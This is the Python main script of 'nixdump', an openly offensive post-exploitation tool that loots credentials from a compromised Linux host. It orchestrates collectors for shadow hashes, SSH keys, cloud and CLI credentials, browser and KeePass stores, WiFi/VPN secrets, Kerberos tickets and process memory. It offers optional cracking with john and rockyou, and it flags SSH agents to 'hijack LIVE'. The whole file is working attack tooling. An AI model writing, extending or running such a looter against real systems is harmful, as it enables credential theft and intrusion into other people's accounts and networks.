#!/usr/bin/env python3
"""nixdump - local Linux credential looter.

Run it on a host you have popped (ideally as root) and it dumps every credential
it can find - shadow hashes (optional offline crack), SSH keys, cloud/CLI creds,
KeePass/Firefox, web-app + DB configs, NetworkManager WiFi/VPN, SSSD cached
domain hashes, Kerberos tickets, and secrets in running processes - into one
unified table.

  ./nixdump.py                 # loot everything readable
  ./nixdump.py --crack         # also crack shadow/kdbx/ssh with john+rockyou
  ./nixdump.py --json --csv -o loot
  ./nixdump.py --only shadow,ssh,cloud
  ./nixdump.py --home-only     # skip full-FS walks (faster/quieter)

Not root? It still runs - root-only collectors (shadow, sssd, networkmanager,
other users' /proc) are skipped automatically.
"""
from __future__ import annotations

import argparse
import os
import sys
import tarfile
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import reporter, tools                              # noqa: E402
from core.secret import Secret, Status                        # noqa: E402
from core.tools import is_root, which                         # noqa: E402
from core.cracker import default_wordlist                     # noqa: E402
from collectors import ALL_COLLECTORS                          # noqa: E402


def build_args() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="nixdump - local Linux credential looter",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("--offline", metavar="ARCHIVE",
                   help="parse a bundle collected by nixdump.sh instead of the "
                        "live host (crack/decrypt here on kali with all tools)")
    p.add_argument("-o", "--out", default="nixdump_loot",
                   help="output directory for exports")
    p.add_argument("--json", action="store_true", help="export loot.json")
    p.add_argument("--csv", action="store_true", help="export loot.csv")
    p.add_argument("--crack", action="store_true",
                   help="offline-crack shadow/kdbx/ssh hashes with john + wordlist")
    p.add_argument("--wordlist", help="wordlist for --crack (default: rockyou if found)")
    p.add_argument("--home-only", action="store_true",
                   help="only read user homes (skip slow full-filesystem walks)")
    p.add_argument("--only", help="comma list of collectors to run (see --list)")
    p.add_argument("--skip", help="comma list of collectors to skip")
    p.add_argument("--list", action="store_true", help="list collectors and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def select(only, skip):
    chosen = list(ALL_COLLECTORS)
    if only:
        keys = {k.strip().lower() for k in only.split(",")}
        chosen = [c for c in chosen if c.name.lower() in keys]
    if skip:
        keys = {k.strip().lower() for k in skip.split(",")}
        chosen = [c for c in chosen if c.name.lower() not in keys]
    return chosen


def _agent_findings(meta_dir) -> list:
    """Turn meta/ssh_agent.txt (captured on the target) into INFO findings:
    whether an agent holds keys, whose agent it is, and the source IPs of
    inbound SSH sessions - so you know a forwarded agent may be hijackable
    LIVE on the box (the key itself is never in the bundle)."""
    import re
    path = os.path.join(meta_dir, "ssh_agent.txt")
    try:
        with open(path, errors="ignore") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return []
    out = []
    section = ""
    for ln in lines:
        s = ln.strip()
        if s.startswith("## "):
            section = s[3:]
            continue
        if not s or s.startswith("<"):
            continue
        sl = section.lower()
        if ("ssh-add" in sl or "keys loaded" in sl) and re.search(r"SHA256:|MD5:|^\d{3,4} ", s):
            out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                              secret_type="agent-key",
                              notes="key loaded in a target agent; hijack LIVE via SSH_AUTH_SOCK"))
        elif "agent sockets" in sl and "agent." in s:
            out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                              secret_type="agent-sock",
                              notes="agent socket on target (owner = whose agent)"))
        elif "came from" in sl or "inbound ssh" in sl:
            out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                              secret_type="login-src",
                              notes="logged-in user / SSH source IP"))
    return out


def main() -> int:
    args = build_args().parse_args()
    reporter.print_banner()

    if args.list:
        print("Collectors (key -> description):")
        for c in ALL_COLLECTORS:
            root = " [root]" if c.needs_root else ""
            print(f"  {c.name.lower():<12} {c.description}{root}")
        return 0

    meta_dir = None
    offline = bool(args.offline)
    if offline:
        if not os.path.isfile(args.offline):
            print(f"[!] archive not found: {args.offline}", file=sys.stderr)
            return 2
        tmp = tempfile.mkdtemp(prefix="nixdump-offline-")
        try:
            with tarfile.open(args.offline) as tf:
                try:
                    tf.extractall(tmp, filter="data")   # py3.12+ safe extract
                except TypeError:
                    tf.extractall(tmp)
        except Exception as e:
            print(f"[!] failed to extract bundle: {e}", file=sys.stderr)
            return 2
        root_dir = os.path.join(tmp, "root")
        meta_dir = os.path.join(tmp, "meta")
        tools.set_root(root_dir)
        print(f"[*] offline mode: {args.offline}", file=sys.stderr)
        man = os.path.join(meta_dir, "manifest.txt")
        if os.path.isfile(man):
            with open(man, errors="ignore") as fh:
                for ln in fh:
                    print(f"    {ln.rstrip()}", file=sys.stderr)

    # root gating: live -> depends on euid; offline -> bundle already holds
    # whatever the operator could read, so run every collector.
    root = True if offline else is_root()
    if not offline:
        print(f"[*] euid: {'root' if root else 'non-root (root-only collectors skipped)'}",
              file=sys.stderr)
    if args.crack:
        wl = args.wordlist or default_wordlist()
        if not which("john"):
            print("[!] --crack set but 'john' not found; hashes will be dumped uncracked",
                  file=sys.stderr)
        elif not wl:
            print("[!] --crack set but no wordlist found; pass --wordlist",
                  file=sys.stderr)
        else:
            print(f"[*] crack enabled (john + {wl})", file=sys.stderr)

    opts = {"crack": args.crack, "wordlist": args.wordlist,
            "home_only": args.home_only, "verbose": args.verbose,
            "offline": offline, "meta_dir": meta_dir}

    collectors = select(args.only, args.skip)
    results = []
    seen = set()
    for Col in collectors:
        if Col.needs_root and not root:
            print(f"   {Col.name:<12} skipped (needs root)", file=sys.stderr)
            continue
        try:
            got = Col(opts).collect()
        except Exception as e:
            print(f"   {Col.name:<12} error: {e}", file=sys.stderr)
            continue
        added = 0
        for s in got:
            if s.key() in seen:
                continue
            seen.add(s.key())
            results.append(s)
            added += 1
        print(f"   {Col.name:<12} {added:>3} finding(s)", file=sys.stderr)

    # offline: surface ssh-agent / logged-in-user intel from the bundle's meta
    if offline and meta_dir:
        for s in _agent_findings(meta_dir):
            if s.key() not in seen:
                seen.add(s.key())
                results.append(s)

    print()
    reporter.render_table(results)
    if args.json or args.csv:
        reporter.export(results, args.out, args.json, args.csv)
        print(f"\n[*] exports written under {args.out}/", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
